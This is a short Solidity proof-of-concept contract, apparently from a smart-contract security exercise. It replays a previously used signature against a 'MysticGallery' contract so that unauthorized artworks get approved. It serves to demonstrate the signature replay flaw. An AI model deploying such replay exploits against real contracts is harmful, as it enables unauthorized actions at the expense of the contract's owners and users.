// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IMysticGallery {
    function submitArtwork(string calldata _artwork, bytes calldata _signature) external;
}

/**
 * @title GalleryHack
 * @dev This contract demonstrates how an attacker could exploit the signature replay vulnerability
 * in the MysticGallery contract to get unauthorized artworks approved.
 */

contract GalleryHack {
    IMysticGallery public targetGallery;

    constructor(address _galleryAddress) {
        targetGallery = IMysticGallery(_galleryAddress);
    }

    // Exploits the vulnerability by replaying a previously used signature.
    function exploit(string calldata _artwork, bytes calldata _signature) external {
        targetGallery.submitArtwork(_artwork, _signature);
    }
}
